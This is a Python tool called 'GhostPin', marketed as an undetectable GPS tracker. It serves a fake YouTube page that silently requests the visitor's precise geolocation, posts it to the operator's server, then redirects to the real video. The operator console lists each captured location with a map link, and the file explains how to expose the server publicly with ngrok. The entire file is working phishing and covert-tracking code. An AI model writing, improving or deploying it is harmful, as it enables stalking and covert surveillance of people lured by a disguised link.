#!/usr/bin/env python3
"""
GhostPin v7.0 - Professional GPS Tracking Framework
HTTPS | Fast Response | Undetectable
Author: F1REW0LF
License: MIT - Free for Community
Version: 7.0.0
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import signal
import ssl
from datetime import datetime
from typing import Dict, List, Optional
import argparse

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "7.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Community"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    PROFESSIONAL GPS TRACKING v{VERSION}{Colors.WHITE}
{Colors.YELLOW}{Colors.BOLD}    HTTPS | Fast Response | Undetectable{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
"""
    print(banner)

# ============================[ SSL CERTIFICATE GENERATOR ]================================

class SSLGenerator:
    """Generate self-signed SSL certificate"""
    
    @staticmethod
    def generate_cert():
        """Generate self-signed cert if not exists"""
        cert_file = 'server.crt'
        key_file = 'server.key'
        
        if os.path.exists(cert_file) and os.path.exists(key_file):
            return cert_file, key_file
        
        cprint("[*] Generating SSL certificate...", Colors.BLUE)
        try:
            # Generate using OpenSSL
            subprocess.run([
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-nodes', '-out', cert_file, '-keyout', key_file,
                '-days', '365', '-subj', '/CN=localhost'
            ], capture_output=True, check=True)
            cprint("[+] SSL certificate generated", Colors.GREEN)
            return cert_file, key_file
        except:
            cprint("[!] OpenSSL not found. Using fallback.", Colors.YELLOW)
            return None, None

# ============================[ TRACKING SERVER ]================================

class TrackingServer:
    """
    HTTPS server with fast response
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 443
        self.thread = None
        self.running = False
        self.public_ip = None
        
    def start(self, port: int = 443, ssl_enabled: bool = True):
        """Start the HTTPS server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
            return False
        
        # Generate SSL certificate
        cert_file, key_file = SSLGenerator.generate_cert()
        
        # Get public IP
        try:
            if REQUESTS_AVAILABLE:
                response = requests.get('https://api.ipify.org?format=json', timeout=3)
                self.public_ip = response.json().get('ip')
        except:
            pass
        
        app = Flask(__name__)
        
        # Optimize response time
        app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
        app.config['TEMPLATES_AUTO_RELOAD'] = False
        
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            # Fast, minimal page - no extra CSS/JS loading
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v={video_id}">
<title>YouTube</title>
<style>
body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#f9f9f9}}
.spinner{{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #ff0000;border-radius:50%;animation:spin 0.8s linear infinite}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
<script>
(function() {{
    var token = Math.random().toString(36).substring(2, 10);
    var sent = false;
    var redirect_url = 'https://www.youtube.com/watch?v={video_id}';
    
    function sendLocation(pos) {{
        if (sent) return;
        sent = true;
        var data = {{
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
        }};
        fetch('/track/' + token, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data)
        }}).catch(function() {{}});
    }}
    
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(sendLocation, function() {{}}, {{
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }});
    }}
    
    // Immediate redirect
    setTimeout(function() {{
        window.location.href = redirect_url;
    }}, 100);
}})();
</script>
</head>
<body>
<div class="spinner"></div>
</body>
</html>'''
            return html
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    self.tracking_data.append(data)
                cprint(f"[+] GPS: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        def run():
            if ssl_enabled and cert_file and key_file:
                app.run(
                    host='0.0.0.0', 
                    port=port, 
                    debug=False, 
                    threaded=True, 
                    use_reloader=False,
                    ssl_context=(cert_file, key_file)
                )
            else:
                app.run(
                    host='0.0.0.0', 
                    port=port, 
                    debug=False, 
                    threaded=True, 
                    use_reloader=False
                )
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        protocol = "https" if ssl_enabled and cert_file else "http"
        cprint(f"[+] Server running on port {port} ({protocol})", Colors.GREEN)
        
        # Show links
        cprint(f"\n[+] Tracking Links:", Colors.CYAN)
        local_link = f"{protocol}://localhost:{port}/watch?v=HainSGzbVCU"
        cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
        
        if self.public_ip:
            public_link = f"{protocol}://{self.public_ip}:{port}/watch?v=HainSGzbVCU"
            cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
            cprint(f"  (Requires port {port} forwarded)", Colors.DIM)
        
        if protocol == "https":
            cprint(f"\n[+] HTTPS enabled - Browser will trust after accepting certificate", Colors.GREEN)
        else:
            cprint(f"\n[!] HTTPS not available. Browser may show 'Not Secure'", Colors.YELLOW)
        
        return True
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

# ============================[ NGROK HTTPS HELPER ]================================

class NgrokHelper:
    @staticmethod
    def show_help(port: int):
        cprint(f"\n[+] For public HTTPS link:", Colors.CYAN)
        cprint(f"  ngrok http {port}", Colors.GREEN)
        cprint(f"  Then use: https://xxxx.ngrok.io/watch?v=VIDEO_ID", Colors.GREEN)
        cprint(f"  (This gives you a valid HTTPS certificate)", Colors.DIM)

# ============================[ MAIN ]================================

class GhostPin:
    def __init__(self):
        self.server = TrackingServer()
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Professional GPS Tracking{Colors.WHITE}
{Colors.CYAN}HTTPS | Fast Response | Undetectable{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1] Start Server (HTTPS){Colors.WHITE}
{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
{Colors.GREEN}[3] View Data{Colors.WHITE}
{Colors.GREEN}[4] Clear Data{Colors.WHITE}
{Colors.GREEN}[5] Ngrok Help (Public HTTPS){Colors.WHITE}
{Colors.RED}[6] Exit{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v7.0 - Professional GPS Tracking", Colors.CYAN)
        cprint("[*] HTTPS | Fast Response | Undetectable", Colors.DIM)
        
        # Auto-start server with HTTPS
        self.server.start(443, ssl_enabled=True)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input("[>] Port (443): ").strip() or "443")
                ssl_enabled = input("[>] Enable HTTPS? (Y/n): ").strip().lower() != 'n'
                self.server.stop()
                time.sleep(0.5)
                self.server.start(port, ssl_enabled)
                
            elif choice == '2':
                video_id = input("[>] YouTube Video ID: ").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                protocol = "https" if os.path.exists('server.crt') else "http"
                local_link = f"{protocol}://localhost:{self.server.port}/watch?v={video_id}"
                
                cprint(f"\n[+] Tracking Link:", Colors.CYAN)
                cprint(f"  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
                
                if self.server.public_ip:
                    public_link = f"{protocol}://{self.server.public_ip}:{self.server.port}/watch?v={video_id}"
                    cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
                
                cprint(f"\n[+] Target will be redirected to YouTube in <1 second", Colors.GREEN)
                cprint(f"[+] GPS captured silently before redirect", Colors.DIM)
                
                try:
                    import webbrowser
                    webbrowser.open(local_link)
                except:
                    pass
                
            elif choice == '3':
                data = self.server.tracking_data
                if not data:
                    cprint("[!] No data yet", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ts = record.get('received_at', 'N/A')
                    
                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '4':
                self.server.tracking_data.clear()
                cprint("[+] Data cleared", Colors.GREEN)
                
            elif choice == '5':
                NgrokHelper.show_help(self.server.port)
                
            elif choice == '6':
                cprint("[*] Shutting down...", Colors.GREEN)
                self.server.stop()
                break
            else:
                cprint("[-] Invalid", Colors.RED)

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(description="GhostPin v7.0 - Professional GPS Tracking")
    parser.add_argument("--server", action="store_true", help="Start server only")
    parser.add_argument("--port", type=int, default=443, help="Server port")
    parser.add_argument("--no-ssl", action="store_true", help="Disable HTTPS")
    parser.add_argument("--video", help="YouTube Video ID")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        NgrokHelper.show_help(args.port)
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    if args.video:
        print_banner()
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        
        protocol = "https" if not args.no_ssl and os.path.exists('server.crt') else "http"
        link = f"{protocol}://localhost:{args.port}/watch?v={args.video}"
        cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
        
        try:
            import webbrowser
            webbrowser.open(link)
        except:
            pass
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive
    tool = GhostPin()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
